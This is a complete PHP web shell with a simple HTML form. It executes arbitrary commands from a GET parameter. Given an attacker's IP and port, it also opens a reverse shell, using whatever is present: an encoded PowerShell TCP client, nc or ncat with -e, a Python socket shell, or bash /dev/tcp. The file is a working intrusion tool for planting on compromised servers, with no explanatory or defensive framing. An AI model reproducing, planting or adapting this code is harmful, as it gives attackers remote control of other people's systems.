<?php
function is_command_available($tool, $os_type) {
    $tool = escapeshellarg($tool);
    if ($os_type === 'windows') {
        $output = shell_exec("where $tool 2>nul");
    } else {
        $output = shell_exec("command -v $tool 2>/dev/null");
    }
    return !empty($output);
}

function get_powershell_script($ip, $port) {
    return '
$client = New-Object System.Net.Sockets.TCPClient("' . $ip . '", ' . $port . ');
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close();
';
}

$os_type = strtolower(PHP_OS_FAMILY);
$command = '';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!empty($_GET['custom_command'])) {
        $command = $_GET['custom_command'];
    } elseif (!empty($_GET['reverse_ip']) && !empty($_GET['reverse_port'])) {
        $ip = $_GET['reverse_ip'];
        $port = $_GET['reverse_port'];
        
        if ($os_type === 'windows') {
            $tools = ['powershell', 'ncat', 'nc', 'cmd'];
            foreach ($tools as $tool) {
                if (is_command_available($tool, $os_type)) {
                    switch ($tool) {
                        case 'powershell':
                            $ps_script = get_powershell_script($ip, $port);
                            $ps_script_utf16 = iconv('UTF-8', 'UTF-16LE', $ps_script);
                            $encoded_script = base64_encode($ps_script_utf16);
                            $command = "powershell -EncodedCommand $encoded_script";
                            break 2;
                        case 'ncat':
                        case 'nc':
                            $command = "$tool $ip $port -e cmd.exe";
                            break 2;
                        case 'cmd':
                            $command = "cmd.exe /c start /B ncat $ip $port -e cmd.exe";
                            break 2;
                    }
                }
            }
        } else {
            $tools = ['python3', 'python', 'nc', 'ncat', 'bash'];
            foreach ($tools as $tool) {
                if (is_command_available($tool, $os_type)) {
                    switch ($tool) {
                        case 'python3':
                        case 'python':
                            $python_code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])";
                            $command = "$tool -c " . escapeshellarg($python_code);
                            break 2;
                        case 'nc':
                            $command = "nc -e /bin/sh $ip $port";
                            break 2;
                        case 'ncat':
                            $command = "ncat $ip $port -e /bin/bash";
                            break 2;
                        case 'bash':
                            $command = "bash -i >& /dev/tcp/$ip/$port 0>&1";
                            break 2;
                    }
                }
            }
        }
    }
}

if (!empty($command)) {
    if ($os_type === 'windows') {
        shell_exec("start /B $command > NUL 2>&1");
    } else {
        shell_exec("$command > /dev/null 2>&1 &");
    }
    echo "Attempted to execute: " . htmlspecialchars($command);
} else {
    echo "Failed to generate command. Check inputs/tools.";
}
?>

<!DOCTYPE html>
<html>
<body>
    <form method="GET">
        Custom Command (optional): <input type="text" name="custom_command"><br>
        Reverse IP: <input type="text" name="reverse_ip"><br>
        Reverse Port: <input type="text" name="reverse_port"><br>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
